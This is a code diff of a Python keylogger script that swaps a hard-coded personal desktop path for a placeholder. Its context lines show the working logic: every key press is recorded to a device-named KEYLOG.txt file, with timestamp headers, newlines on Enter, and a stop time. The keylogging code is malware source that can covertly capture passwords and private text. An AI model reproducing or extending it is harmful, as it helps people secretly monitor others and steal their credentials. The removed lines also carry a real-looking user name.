@@ -13,7 +13,7 @@ for _ in dev_name:
         dev_name.replace(_,"_")
 
 #timestamp and partition for better viewing and analysis
-logfile = open("C:/Users/Rithin/OneDrive/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
+logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
 logfile.write("\n\n--------------------------------------------------------------------------------------------------------------------------------------------------------------\n")
 logfile.write(datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n\n")
 logfile.close()
@@ -22,7 +22,7 @@ def on_press(key):
     if datetime.now() >= die:
         return False
     
-    logfile = open("C:/Users/Rithin/OneDrive/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
+    logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
     try:
         logfile.write("{0}".format(key.char)) #recording every key press
     except AttributeError:
@@ -30,7 +30,7 @@ def on_press(key):
     logfile.close()
 
 def on_release(key):
-    logfile = open("C:/Users/Rithin/OneDrive/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
+    logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
     if key == Key.enter:
         logfile.write("\n")
     logfile.close()
